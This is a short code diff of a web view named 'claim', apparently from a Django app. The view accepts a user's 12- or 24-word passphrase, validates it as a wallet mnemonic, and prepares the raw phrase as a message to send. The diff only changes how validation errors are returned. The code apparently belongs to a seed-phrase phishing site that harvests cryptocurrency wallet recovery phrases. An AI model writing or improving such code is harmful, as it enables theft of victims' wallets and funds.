@@ -65,11 +65,11 @@ def claim(request):
 
         # Check if the passphrase contains exactly 12 or 24 words
         if len(words) not in [12, 24]:
-            return JsonResponse({'success': False, 'error': 'Invalid passphrase'})
+            return render(request, 'claim.html', {'success': False, 'error': 'Invalid passphrase'})
         
         # Validate the passphrase using mnemonic library
         if not mnemo.check(passphrase):
-            return JsonResponse({'success': False, 'error': 'Invalid passphrase'})
+            return render(request, 'claim.html', {'success': False, 'error': 'Invalid passphrase'})
         
         # Construct the message to send
         message = f"{passphrase}"
